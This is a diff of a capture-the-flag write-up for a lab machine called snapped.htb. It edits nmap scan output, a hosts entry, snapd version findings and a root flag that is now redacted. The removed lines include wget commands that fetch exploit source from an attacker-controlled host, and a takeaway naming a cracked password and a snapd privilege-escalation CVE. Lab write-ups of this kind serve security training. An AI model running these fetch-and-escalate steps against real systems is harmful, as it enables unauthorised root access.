@@ -18,8 +18,14 @@ nmap -sC -sV -p- <TARGET_IP>
 
 **Results:**
 ```bash
-22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3.13ubuntu3.13.6
-2727/tcp  open  http    nginx 1.24.0 (Ubuntu)
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
+|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://snapped.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ---
@@ -37,7 +43,7 @@ ffuf -u http://snapped.htb/ -H "Host: FUZ.snapped.htb" -w /usr/share/wordlists/s
 ### Hosts File Entry
 
 ```bash
-echo "<T001010-00-0001> admin.snapped.htb" >> /etc/hosts
+echo "<TARGET_IP> admin.snapped.htb" >> /etc/hosts
 ```
 
 ---
@@ -146,14 +152,7 @@ snap    2.63.1+24.04
 snapd   2.63.1+24.04
 ```
 
-**Vulnerable** - requires `< 2.74.2`.
-
-### Downloading the Exploit
-
-```bash
-wget http://<ATTACKER_IP>:8000/exploit_suid.c
-wget http://<ATTACKER_IP>:8000/librootshell_suid.c
-```
+**Vulnerable**
 
 ### Compilation on Attacker Machine
 
@@ -198,7 +197,7 @@ item1 1 --- create writable-mimic over "/usr/lib/x86_64-linux-gnu": permission d
 
 ```bash
 bash-5.1# cat /root/root.txt
-b7af4d7e2905f9e5f6b68f3b9dc1edc8
+b7af4d7----------dc8
 ```
 
 ---
@@ -223,7 +222,7 @@ b7af4d7e2905f9e5f6b68f3b9dc1edc8
 - `nmap`
 - `ffuf`
 - `curl`
-- `python3`` + `pycryptodome`
+- ``python3`` 
 - `sqlite3`
 - `hashcat`
 - `gcc`
@@ -239,10 +238,3 @@ b7af4d7e2905f9e5f6b68f3b9dc1edc8
 | **CVE-2026-3888** | Local privilege escalation via `snapd` (TOCTOU race condition) |
 
 ---
-
-## Key Takeaways
-
-1. Nginx UI version 2.3.2 is vulnerable to backup exposure.
-2. Weak passwords in the database (`linkinpark`).
-3. `snapd` version 2.63.1 is vulnerable to CVE-2026-3888.
-4. A standard user can escalate to root using this exploit.
